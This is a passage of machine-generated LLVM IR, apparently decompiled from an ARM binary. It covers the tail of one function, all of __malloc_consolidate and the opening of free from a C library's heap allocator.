  %v1_eec4 = load i32, i32* @r6, align 4
  %v2_eec4 = sub i32 %v1_eec4, %v2_eeb8
  store i32 %v2_eec4, i32* %r2.global-to-local, align 4
  %v1_eec8 = add i32 %v0_eec0, 44
  %v2_eec8 = inttoptr i32 %v1_eec8 to i32*
  %v3_eec8 = load i32, i32* %v2_eec8, align 4
  store i32 %v3_eec8, i32* %r1.global-to-local, align 4
  %v2_eecc = sub i32 %v3_eec0, %v2_eeb8
  %v1_eed0 = or i32 %v2_eec4, 1
  store i32 %v1_eed0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_eecc, i32* %v2_eec0, align 4
  %v0_eedc = load i32, i32* %r2.global-to-local, align 4
  %v1_eedc = load i32, i32* %r1.global-to-local, align 4
  %v2_eedc = add i32 %v1_eedc, 4
  %v3_eedc = inttoptr i32 %v2_eedc to i32*
  store i32 %v0_eedc, i32* %v3_eedc, align 4
  %v1_eef0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eee8

dec_label_pc_eee4:                                ; preds = %dec_label_pc_ee84, %dec_label_pc_eeb8, %dec_label_pc_eea0, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eee8

dec_label_pc_eee8:                                ; preds = %dec_label_pc_eec0, %dec_label_pc_eee4
  %v1_eef0 = phi i32 [ %v1_eef0.pre, %dec_label_pc_eec0 ], [ 0, %dec_label_pc_eee4 ]
  store i32 %v12_ee48, i32* @r7, align 4
  ret i32 %v1_eef0

; uselistorder directives
  uselistorder i1 %v7_eeb0, { 1, 0 }
  uselistorder i32 %v1_eeac, { 2, 1, 0, 3 }
  uselistorder i32 %v3_ee50, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_eee8, { 1, 0 }
  uselistorder label %dec_label_pc_eee4, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_eef4 = load i32, i32* @r4, align 4
  store i32 %v3_eef4, i32* %stack_var_-36, align 4
  %v0_eef8 = load i32, i32* @r0, align 4
  %v1_eef8 = inttoptr i32 %v0_eef8 to i32*
  %v2_eef8 = load i32, i32* %v1_eef8, align 4
  store i32 %v2_eef8, i32* %r3.global-to-local, align 4
  %v2_eefc = icmp eq i32 %v2_eef8, 0
  store i32 %v0_eef8, i32* @r4, align 4
  br i1 %v2_eefc, label %dec_label_pc_f034.preheader, label %dec_label_pc_ef10

dec_label_pc_f034.preheader:                      ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_f03c25 = add i32 %v0_eef8, 52
  store i32 %v1_f03c25, i32* %r3.global-to-local, align 4
  %v2_f04426 = add i32 %v0_eef8, 60
  %v3_f04427 = inttoptr i32 %v2_f04426 to i32*
  store i32 %v1_f03c25, i32* %v3_f04427, align 4
  %v0_f04828 = load i32, i32* %r3.global-to-local, align 4
  %v2_f04829 = add i32 %v0_f04828, 12
  %v3_f04830 = inttoptr i32 %v2_f04829 to i32*
  store i32 %v0_f04828, i32* %v3_f04830, align 4
  br label %dec_label_pc_f034.dec_label_pc_f034_crit_edge

dec_label_pc_ef10:                                ; preds = %entry
  %v1_ef10 = and i32 %v2_eef8, -3
  %v3_ef14 = udiv i32 %v2_eef8, 8
  store i32 %v3_ef14, i32* %r2.global-to-local, align 4
  store i32 %v1_ef10, i32* %v1_eef8, align 4
  %v0_ef1c = load i32, i32* @r0, align 4
  %v1_ef1c = add i32 %v0_ef1c, -4
  store i32 %v1_ef1c, i32* %r3.global-to-local, align 4
  %v1_ef20 = load i32, i32* %r2.global-to-local, align 4
  %v4_ef20 = mul i32 %v1_ef20, 4
  %v5_ef20 = add i32 %v4_ef20, %v1_ef1c
  store i32 %v5_ef20, i32* %sb.global-to-local, align 4
  %v1_ef24 = add i32 %v0_ef1c, 52
  store i32 %v1_ef24, i32* %r7.global-to-local, align 4
  %v1_ef28 = add i32 %v0_ef1c, 4
  store i32 %v1_ef28, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_ef30

dec_label_pc_ef30:                                ; preds = %dec_label_pc_f02c, %dec_label_pc_ef10
  %v1_f02410 = phi i32 [ %v1_f024, %dec_label_pc_f02c ], [ %v5_ef20, %dec_label_pc_ef10 ]
  %v1_ef3c = phi i32 [ %v1_f02c, %dec_label_pc_f02c ], [ %v1_ef28, %dec_label_pc_ef10 ]
  %v1_ef30 = inttoptr i32 %v1_ef3c to i32*
  %v2_ef30 = load i32, i32* %v1_ef30, align 4
  store i32 %v2_ef30, i32* %r1.global-to-local, align 4
  %v2_ef34 = icmp eq i32 %v2_ef30, 0
  br i1 %v2_ef34, label %dec_label_pc_f024, label %dec_label_pc_ef3c

dec_label_pc_ef3c:                                ; preds = %dec_label_pc_ef30
  %v0_ef3c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_ef3c, i32* %v1_ef30, align 4
  %v0_ef40.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ef40

dec_label_pc_ef40:                                ; preds = %dec_label_pc_f018, %dec_label_pc_ef3c
  %v0_ef5c = phi i32 [ %v0_f018, %dec_label_pc_f018 ], [ %v0_ef40.pre, %dec_label_pc_ef3c ]
  %v1_ef40 = add i32 %v0_ef5c, 4
  %v2_ef40 = inttoptr i32 %v1_ef40 to i32*
  %v3_ef40 = load i32, i32* %v2_ef40, align 4
  store i32 %v3_ef40, i32* %r3.global-to-local, align 4
  %v1_ef44 = and i32 %v3_ef40, -2
  store i32 %v1_ef44, i32* %lr.global-to-local, align 4
  %v2_ef48 = add i32 %v1_ef44, %v0_ef5c
  store i32 %v2_ef48, i32* @r0, align 4
  %v1_ef4c = urem i32 %v3_ef40, 2
  %v2_ef4c = icmp eq i32 %v1_ef4c, 0
  %v1_ef50 = add i32 %v0_ef5c, 8
  %v2_ef50 = inttoptr i32 %v1_ef50 to i32*
  %v3_ef50 = load i32, i32* %v2_ef50, align 4
  store i32 %v3_ef50, i32* %sl.global-to-local, align 4
  %v1_ef54 = add i32 %v2_ef48, 4
  %v2_ef54 = inttoptr i32 %v1_ef54 to i32*
  %v3_ef54 = load i32, i32* %v2_ef54, align 4
  store i32 %v3_ef54, i32* %r8.global-to-local, align 4
  br i1 %v2_ef4c, label %dec_label_pc_ef5c, label %dec_label_pc_ef90

dec_label_pc_ef5c:                                ; preds = %dec_label_pc_ef40
  %v1_ef5c = inttoptr i32 %v0_ef5c to i32*
  %v2_ef5c = load i32, i32* %v1_ef5c, align 4
  store i32 %v2_ef5c, i32* %r5.global-to-local, align 4
  %v2_ef60 = sub i32 %v0_ef5c, %v2_ef5c
  store i32 %v2_ef60, i32* %r3.global-to-local, align 4
  %v1_ef64 = add i32 %v2_ef60, 8
  %v2_ef64 = inttoptr i32 %v1_ef64 to i32*
  %v3_ef64 = load i32, i32* %v2_ef64, align 4
  store i32 %v3_ef64, i32* %ip.global-to-local, align 4
  %v1_ef68 = add i32 %v3_ef64, 12
  %v2_ef68 = inttoptr i32 %v1_ef68 to i32*
  %v3_ef68 = load i32, i32* %v2_ef68, align 4
  store i32 %v3_ef68, i32* %r1.global-to-local, align 4
  %v9_ef6c = icmp eq i32 %v3_ef68, %v2_ef60
  %v1_ef70 = add i32 %v2_ef60, 12
  %v2_ef70 = inttoptr i32 %v1_ef70 to i32*
  %v3_ef70 = load i32, i32* %v2_ef70, align 4
  store i32 %v3_ef70, i32* %r2.global-to-local, align 4
  br i1 %v9_ef6c, label %dec_label_pc_ef78, label %dec_label_pc_efd4

dec_label_pc_ef78:                                ; preds = %dec_label_pc_ef5c
  %v1_ef78 = add i32 %v3_ef70, 8
  %v2_ef78 = inttoptr i32 %v1_ef78 to i32*
  %v3_ef78 = load i32, i32* %v2_ef78, align 4
  store i32 %v3_ef78, i32* %r3.global-to-local, align 4
  %v9_ef7c = icmp eq i32 %v3_ef78, %v2_ef60
  br i1 %v9_ef7c, label %dec_label_pc_ef84, label %dec_label_pc_efd4

dec_label_pc_ef84:                                ; preds = %dec_label_pc_ef78
  store i32 %v3_ef64, i32* %v2_ef78, align 4
  %v0_ef88 = load i32, i32* %r2.global-to-local, align 4
  %v1_ef88 = load i32, i32* %ip.global-to-local, align 4
  %v2_ef88 = add i32 %v1_ef88, 12
  %v3_ef88 = inttoptr i32 %v2_ef88 to i32*
  store i32 %v0_ef88, i32* %v3_ef88, align 4
  %v0_ef8c = load i32, i32* %lr.global-to-local, align 4
  %v1_ef8c = load i32, i32* %r5.global-to-local, align 4
  %v2_ef8c = add i32 %v1_ef8c, %v0_ef8c
  store i32 %v2_ef8c, i32* %lr.global-to-local, align 4
  %v0_ef94.pre = load i32, i32* @r0, align 4
  %v0_ef98.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_ef90

dec_label_pc_ef90:                                ; preds = %dec_label_pc_ef40, %dec_label_pc_ef84
  %v0_f008 = phi i32 [ %v1_ef44, %dec_label_pc_ef40 ], [ %v2_ef8c, %dec_label_pc_ef84 ]
  %v0_ef98 = phi i32 [ %v3_ef54, %dec_label_pc_ef40 ], [ %v0_ef98.pre, %dec_label_pc_ef84 ]
  %v1_efac = phi i32 [ %v2_ef48, %dec_label_pc_ef40 ], [ %v0_ef94.pre, %dec_label_pc_ef84 ]
  %v0_ef90 = load i32, i32* @r4, align 4
  %v1_ef90 = add i32 %v0_ef90, 44
  %v2_ef90 = inttoptr i32 %v1_ef90 to i32*
  %v3_ef90 = load i32, i32* %v2_ef90, align 4
  store i32 %v3_ef90, i32* %r3.global-to-local, align 4
  %v9_ef94 = icmp eq i32 %v1_efac, %v3_ef90
  %v1_ef98 = and i32 %v0_ef98, -4
  store i32 %v1_ef98, i32* %r5.global-to-local, align 4
  br i1 %v9_ef94, label %dec_label_pc_f008, label %dec_label_pc_efa0

dec_label_pc_efa0:                                ; preds = %dec_label_pc_ef90
  %v2_efa0 = add i32 %v1_efac, %v1_ef98
  store i32 %v2_efa0, i32* %r3.global-to-local, align 4
  %v1_efa4 = add i32 %v2_efa0, 4
  %v2_efa4 = inttoptr i32 %v1_efa4 to i32*
  %v3_efa4 = load i32, i32* %v2_efa4, align 4
  store i32 %v3_efa4, i32* %r3.global-to-local, align 4
  %v1_efa8 = urem i32 %v3_efa4, 2
  %v2_efa8 = icmp eq i32 %v1_efa8, 0
  %v2_efac = add i32 %v1_efac, 4
  %v3_efac = inttoptr i32 %v2_efac to i32*
  store i32 %v1_ef98, i32* %v3_efac, align 4
  br i1 %v2_efa8, label %dec_label_pc_efb4, label %dec_label_pc_efa0.dec_label_pc_efe4_crit_edge

dec_label_pc_efa0.dec_label_pc_efe4_crit_edge:    ; preds = %dec_label_pc_efa0
  %v0_efe8.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_efe4

dec_label_pc_efb4:                                ; preds = %dec_label_pc_efa0
  %v0_efb4 = load i32, i32* @r0, align 4
  %v1_efb4 = add i32 %v0_efb4, 8
  %v2_efb4 = inttoptr i32 %v1_efb4 to i32*
  %v3_efb4 = load i32, i32* %v2_efb4, align 4
  store i32 %v3_efb4, i32* %ip.global-to-local, align 4
  %v1_efb8 = add i32 %v3_efb4, 12
  %v2_efb8 = inttoptr i32 %v1_efb8 to i32*
  %v3_efb8 = load i32, i32* %v2_efb8, align 4
  store i32 %v3_efb8, i32* %r3.global-to-local, align 4
  %v9_efbc = icmp eq i32 %v3_efb8, %v0_efb4
  %v1_efc0 = add i32 %v0_efb4, 12
  %v2_efc0 = inttoptr i32 %v1_efc0 to i32*
  %v3_efc0 = load i32, i32* %v2_efc0, align 4
  store i32 %v3_efc0, i32* %r2.global-to-local, align 4
  br i1 %v9_efbc, label %dec_label_pc_efc8, label %dec_label_pc_efd4

dec_label_pc_efc8:                                ; preds = %dec_label_pc_efb4
  %v1_efc8 = add i32 %v3_efc0, 8
  %v2_efc8 = inttoptr i32 %v1_efc8 to i32*
  %v3_efc8 = load i32, i32* %v2_efc8, align 4
  store i32 %v3_efc8, i32* %r3.global-to-local, align 4
  %v9_efcc = icmp eq i32 %v3_efc8, %v0_efb4
  br i1 %v9_efcc, label %dec_label_pc_efd8, label %dec_label_pc_efd4

dec_label_pc_efd4:                                ; preds = %dec_label_pc_efb4, %dec_label_pc_ef78, %dec_label_pc_ef5c, %dec_label_pc_efc8
  %v0_efd4 = call i32 @abort()
  store i32 %v0_efd4, i32* @r0, align 4
  %v0_efd8.pre = load i32, i32* @ip, align 4
  %v1_efd8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_efd8

dec_label_pc_efd8:                                ; preds = %dec_label_pc_efc8, %dec_label_pc_efd4
  %v1_efd8 = phi i32 [ %v3_efc0, %dec_label_pc_efc8 ], [ %v1_efd8.pre, %dec_label_pc_efd4 ]
  %v0_efd8 = phi i32 [ %v3_efb4, %dec_label_pc_efc8 ], [ %v0_efd8.pre, %dec_label_pc_efd4 ]
  %v2_efd8 = add i32 %v1_efd8, 8
  %v3_efd8 = inttoptr i32 %v2_efd8 to i32*
  store i32 %v0_efd8, i32* %v3_efd8, align 4
  %v0_efdc = load i32, i32* %r2.global-to-local, align 4
  %v1_efdc = load i32, i32* %ip.global-to-local, align 4
  %v2_efdc = add i32 %v1_efdc, 12
  %v3_efdc = inttoptr i32 %v2_efdc to i32*
  store i32 %v0_efdc, i32* %v3_efdc, align 4
  %v0_efe0 = load i32, i32* %lr.global-to-local, align 4
  %v1_efe0 = load i32, i32* %r5.global-to-local, align 4
  %v2_efe0 = add i32 %v1_efe0, %v0_efe0
  store i32 %v2_efe0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_efe4

dec_label_pc_efe4:                                ; preds = %dec_label_pc_efa0.dec_label_pc_efe4_crit_edge, %dec_label_pc_efd8
  %v0_efe8 = phi i32 [ %v0_efe8.pre, %dec_label_pc_efa0.dec_label_pc_efe4_crit_edge ], [ %v2_efe0, %dec_label_pc_efd8 ]
  %v0_efe4 = load i32, i32* %r7.global-to-local, align 4
  %v1_efe4 = add i32 %v0_efe4, 8
  %v2_efe4 = inttoptr i32 %v1_efe4 to i32*
  %v3_efe4 = load i32, i32* %v2_efe4, align 4
  store i32 %v3_efe4, i32* %r2.global-to-local, align 4
  %v1_efe8 = or i32 %v0_efe8, 1
  store i32 %v1_efe8, i32* %r3.global-to-local, align 4
  %v0_efec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_efec, i32* %v2_efe4, align 4
  %v0_eff0 = load i32, i32* %r1.global-to-local, align 4
  %v1_eff0 = load i32, i32* %r2.global-to-local, align 4
  %v2_eff0 = add i32 %v1_eff0, 12
  %v3_eff0 = inttoptr i32 %v2_eff0 to i32*
  store i32 %v0_eff0, i32* %v3_eff0, align 4
  %v0_eff4 = load i32, i32* %lr.global-to-local, align 4
  %v1_eff4 = load i32, i32* %r1.global-to-local, align 4
  %v3_eff4 = add i32 %v1_eff4, %v0_eff4
  %v4_eff4 = inttoptr i32 %v3_eff4 to i32*
  store i32 %v0_eff4, i32* %v4_eff4, align 4
  %v0_eff8 = load i32, i32* %r3.global-to-local, align 4
  %v1_eff8 = load i32, i32* %r1.global-to-local, align 4
  %v2_eff8 = add i32 %v1_eff8, 4
  %v3_eff8 = inttoptr i32 %v2_eff8 to i32*
  store i32 %v0_eff8, i32* %v3_eff8, align 4
  %v0_effc = load i32, i32* %r2.global-to-local, align 4
  %v1_effc = load i32, i32* %r1.global-to-local, align 4
  %v2_effc = add i32 %v1_effc, 8
  %v3_effc = inttoptr i32 %v2_effc to i32*
  store i32 %v0_effc, i32* %v3_effc, align 4
  %v0_f000 = load i32, i32* %r7.global-to-local, align 4
  %v1_f000 = load i32, i32* %r1.global-to-local, align 4
  %v2_f000 = add i32 %v1_f000, 12
  %v3_f000 = inttoptr i32 %v2_f000 to i32*
  store i32 %v0_f000, i32* %v3_f000, align 4
  br label %dec_label_pc_f018

dec_label_pc_f008:                                ; preds = %dec_label_pc_ef90
  %v2_f008 = add i32 %v1_ef98, %v0_f008
  %v1_f00c = or i32 %v2_f008, 1
  store i32 %v1_f00c, i32* %r3.global-to-local, align 4
  %v1_f010 = load i32, i32* %r1.global-to-local, align 4
  %v2_f010 = add i32 %v1_f010, 4
  %v3_f010 = inttoptr i32 %v2_f010 to i32*
  store i32 %v1_f00c, i32* %v3_f010, align 4
  %v0_f014 = load i32, i32* %r1.global-to-local, align 4
  %v1_f014 = load i32, i32* @r4, align 4
  %v2_f014 = add i32 %v1_f014, 44
  %v3_f014 = inttoptr i32 %v2_f014 to i32*
  store i32 %v0_f014, i32* %v3_f014, align 4
  br label %dec_label_pc_f018

dec_label_pc_f018:                                ; preds = %dec_label_pc_efe4, %dec_label_pc_f008
  %v0_f018 = load i32, i32* %sl.global-to-local, align 4
  %v2_f018 = icmp eq i32 %v0_f018, 0
  store i32 %v0_f018, i32* %r1.global-to-local, align 4
  br i1 %v2_f018, label %dec_label_pc_f024.loopexit, label %dec_label_pc_ef40

dec_label_pc_f024.loopexit:                       ; preds = %dec_label_pc_f018
  %v0_f024.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_f024.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_f024

dec_label_pc_f024:                                ; preds = %dec_label_pc_f024.loopexit, %dec_label_pc_ef30
  %v1_f024 = phi i32 [ %v1_f024.pre, %dec_label_pc_f024.loopexit ], [ %v1_f02410, %dec_label_pc_ef30 ]
  %v0_f02c = phi i32 [ %v0_f024.pre, %dec_label_pc_f024.loopexit ], [ %v1_ef3c, %dec_label_pc_ef30 ]
  %v9_f024 = icmp eq i32 %v0_f02c, %v1_f024
  br i1 %v9_f024, label %dec_label_pc_f09c, label %dec_label_pc_f02c

dec_label_pc_f02c:                                ; preds = %dec_label_pc_f024
  %v1_f02c = add i32 %v0_f02c, 4
  store i32 %v1_f02c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_ef30

dec_label_pc_f034.dec_label_pc_f034_crit_edge:    ; preds = %dec_label_pc_f034.preheader, %dec_label_pc_f034.dec_label_pc_f034_crit_edge
  %v0_f034.pre = load i32, i32* @r4, align 4
  %v1_f034.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_f034 = mul i32 %v1_f034.pre, 8
  %v5_f034 = add i32 %v4_f034, %v0_f034.pre
  %v1_f038 = add i32 %v1_f034.pre, 1
  store i32 %v1_f038, i32* %r2.global-to-local, align 4
  %v1_f03c = add i32 %v5_f034, 44
  store i32 %v1_f03c, i32* %r3.global-to-local, align 4
  %v2_f044 = add i32 %v5_f034, 52
  %v3_f044 = inttoptr i32 %v2_f044 to i32*
  store i32 %v1_f03c, i32* %v3_f044, align 4
  %v0_f048 = load i32, i32* %r3.global-to-local, align 4
  %v2_f048 = add i32 %v0_f048, 12
  %v3_f048 = inttoptr i32 %v2_f048 to i32*
  store i32 %v0_f048, i32* %v3_f048, align 4
  %v7_f04c = icmp sgt i32 %v1_f038, 95
  br i1 %v7_f04c, label %dec_label_pc_f050, label %dec_label_pc_f034.dec_label_pc_f034_crit_edge

dec_label_pc_f050:                                ; preds = %dec_label_pc_f034.dec_label_pc_f034_crit_edge
  %v0_f050 = load i32, i32* @r4, align 4
  %v1_f050 = inttoptr i32 %v0_f050 to i32*
  %v2_f050 = load i32, i32* %v1_f050, align 4
  store i32 %v2_f050, i32* %r2.global-to-local, align 4
  %v1_f054 = add i32 %v0_f050, 864
  %v2_f054 = inttoptr i32 %v1_f054 to i32*
  %v3_f054 = load i32, i32* %v2_f054, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f05c = urem i32 %v2_f050, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_f064 = or i32 %v3_f054, 1
  store i32 %v1_f064, i32* %r1.global-to-local, align 4
  %v1_f068 = or i32 %v1_f05c, 72
  store i32 %v1_f068, i32* %r2.global-to-local, align 4
  %v1_f06c = add i32 %v0_f050, 52
  store i32 %v1_f06c, i32* %ip.global-to-local, align 4
  %v2_f070 = add i32 %v0_f050, 840
  %v3_f070 = inttoptr i32 %v2_f070 to i32*
  store i32 0, i32* %v3_f070, align 4
  %v0_f074 = load i32, i32* %r3.global-to-local, align 4
  %v1_f074 = add i32 %v0_f074, 65536
  store i32 %v1_f074, i32* %r3.global-to-local, align 4
  %v0_f078 = load i32, i32* %r0.global-to-local, align 4
  %v1_f078 = load i32, i32* @r4, align 4
  %v2_f078 = add i32 %v1_f078, 836
  %v3_f078 = inttoptr i32 %v2_f078 to i32*
  store i32 %v0_f078, i32* %v3_f078, align 4
  %v0_f07c = load i32, i32* %r0.global-to-local, align 4
  %v1_f07c = load i32, i32* @r4, align 4
  %v2_f07c = add i32 %v1_f07c, 844
  %v3_f07c = inttoptr i32 %v2_f07c to i32*
  store i32 %v0_f07c, i32* %v3_f07c, align 4
  %v1_f080 = load i32, i32* @r4, align 4
  %v2_f080 = add i32 %v1_f080, 852
  %v3_f080 = inttoptr i32 %v2_f080 to i32*
  store i32 %v1_f074, i32* %v3_f080, align 4
  %v1_f084 = load i32, i32* @r4, align 4
  %v2_f084 = add i32 %v1_f084, 864
  %v3_f084 = inttoptr i32 %v2_f084 to i32*
  store i32 %v1_f064, i32* %v3_f084, align 4
  %v1_f088 = load i32, i32* @r4, align 4
  %v2_f088 = inttoptr i32 %v1_f088 to i32*
  store i32 %v1_f068, i32* %v2_f088, align 4
  %v0_f08c = load i32, i32* %ip.global-to-local, align 4
  %v1_f08c = load i32, i32* @r4, align 4
  %v2_f08c = add i32 %v1_f08c, 44
  %v3_f08c = inttoptr i32 %v2_f08c to i32*
  store i32 %v0_f08c, i32* %v3_f08c, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_f094 = call i32 @sysconf(i32 30, i32 %v1_f064, i32 %v1_f068, i32 %v1_f074)
  store i32 %v4_f094, i32* @r0, align 4
  %v1_f098 = load i32, i32* @r4, align 4
  %v2_f098 = add i32 %v1_f098, 860
  %v3_f098 = inttoptr i32 %v2_f098 to i32*
  store i32 %v4_f094, i32* %v3_f098, align 4
  br label %dec_label_pc_f09c

dec_label_pc_f09c:                                ; preds = %dec_label_pc_f024, %dec_label_pc_f050
  %v2_f0a0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_f0a0, i32* @r4, align 4
  %v1_f0a4 = load i32, i32* @r0, align 4
  ret i32 %v1_f0a4

; uselistorder directives
  uselistorder i32 %v0_f050, { 1, 0, 2, 3 }
  uselistorder i32 %v0_f048, { 1, 0 }
  uselistorder i32 %v1_f02c, { 1, 0 }
  uselistorder i32 %v0_f018, { 0, 2, 1 }
  uselistorder i32 %v0_eff4, { 1, 0 }
  uselistorder i32 %v1_ef44, { 1, 0, 2 }
  uselistorder i32 %v0_ef5c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_ef1c, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 3, 2, 0, 1 }
  uselistorder i32 852, { 1, 0 }
  uselistorder i32 844, { 1, 0 }
  uselistorder i32 864, { 6, 7, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_f09c, { 1, 0 }
  uselistorder label %dec_label_pc_f034.dec_label_pc_f034_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f018, { 1, 0 }
  uselistorder label %dec_label_pc_efe4, { 1, 0 }
  uselistorder label %dec_label_pc_efd8, { 1, 0 }
  uselistorder label %dec_label_pc_efd4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_ef90, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_f0a8 = load i32, i32* @r4, align 4
  %v6_f0a8 = load i32, i32* @r5, align 4
  %v9_f0a8 = load i32, i32* @r6, align 4
  %v12_f0a8 = load i32, i32* @r7, align 4
  %v18_f0a8 = load i32, i32* @lr, align 4
  %v0_f0b0 = load i32, i32* @r0, align 4
  store i32 %v0_f0b0, i32* @r6, align 4
  %v2_f0b0 = icmp eq i32 %v0_f0b0, 0
  %v2_f0b4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r7, align 4
  br i1 %v2_f0b0, label %dec_label_pc_f2bc, label %dec_label_pc_f0c0

dec_label_pc_f0c0:                                ; preds = %entry
  store i32 116, i32* %r3.global-to-local, align 4
  %v4_f0c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 116) to i32*), align 4
  store i32 %v4_f0c4, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 %v4_f0c4, i32* %r2.global-to-local, align 4
  %v4_f0d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 72) to i32*), align 4
  store i32 %v4_f0d0, i32* %r1.global-to-local, align 4
  store i32 %v2_f0b4, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  %v4_f0dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 120) to i32*), align 4
  store i32 %v4_f0dc, i32* %ip.global-to-local, align 4
  store i32 61672, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_f0dc)
  %v0_f0e8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_f0e8, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_f0f0 = load i32, i32* @r7, align 4
  %v2_f0f0 = add i32 %v0_f0f0, 16
  %v3_f0f0 = inttoptr i32 %v2_f0f0 to i32*
  %v4_f0f0 = load i32, i32* %v3_f0f0, align 4
  store i32 %v4_f0f0, i32* %ip.global-to-local, align 4
  store i32 61692, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_f0f0)
  store i32 68, i32* %r3.global-to-local, align 4
  %v0_f100 = load i32, i32* @r7, align 4
  %v2_f100 = add i32 %v0_f100, 68
  %v3_f100 = inttoptr i32 %v2_f100 to i32*
  %v4_f100 = load i32, i32* %v3_f100, align 4
  store i32 %v4_f100, i32* @lr, align 4
  %v0_f104 = load i32, i32* @r6, align 4
  %v1_f104 = add i32 %v0_f104, -4
  %v2_f104 = inttoptr i32 %v1_f104 to i32*
  %v3_f104 = load i32, i32* %v2_f104, align 4
  store i32 %v3_f104, i32* %r2.global-to-local, align 4
  %v1_f108 = inttoptr i32 %v4_f100 to i32*
  %v2_f108 = load i32, i32* %v1_f108, align 4
  store i32 %v2_f108, i32* %r3.global-to-local, align 4
  %v1_f10c = and i32 %v3_f104, -4
  store i32 %v1_f10c, i32* %ip.global-to-local, align 4
  %v1_f110 = add i32 %v0_f104, -8
  store i32 %v1_f110, i32* @r5, align 4
  store i32 %v1_f110, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_f10c, %v2_f108
  br i1 %tmp, label %dec_label_pc_f140, label %dec_label_pc_f120

dec_label_pc_f120:                                ; preds = %dec_label_pc_f0c0
  %v1_f120 = or i32 %v2_f108, 3
  store i32 %v1_f120, i32* %r3.global-to-local, align 4
  store i32 %v1_f120, i32* %v1_f108, align 4
  %v3_f124 = load i32, i32* @lr, align 4
  %v4_f124 = add i32 %v3_f124, -8
  store i32 %v4_f124, i32* %lr.global-to-local, align 4
  %v0_f128 = load i32, i32* %ip.global-to-local, align 4
  %v3_f128 = udiv i32 %v0_f128, 8
  store i32 %v3_f128, i32* %r1.global-to-local, align 4
  %v1_f12c = add i32 %v3_f124, -4
  store i32 %v1_f12c, i32* %r2.global-to-local, align 4
  %v4_f130 = mul nuw i32 %v3_f128, 4
  %v5_f130 = add i32 %v4_f130, %v1_f12c
  %v6_f130 = inttoptr i32 %v5_f130 to i32*
  %v7_f130 = load i32, i32* %v6_f130, align 4
  store i32 %v7_f130, i32* %r3.global-to-local, align 4
  %v1_f134 = load i32, i32* @r5, align 4
  %v2_f134 = add i32 %v1_f134, 8
  %v3_f134 = inttoptr i32 %v2_f134 to i32*
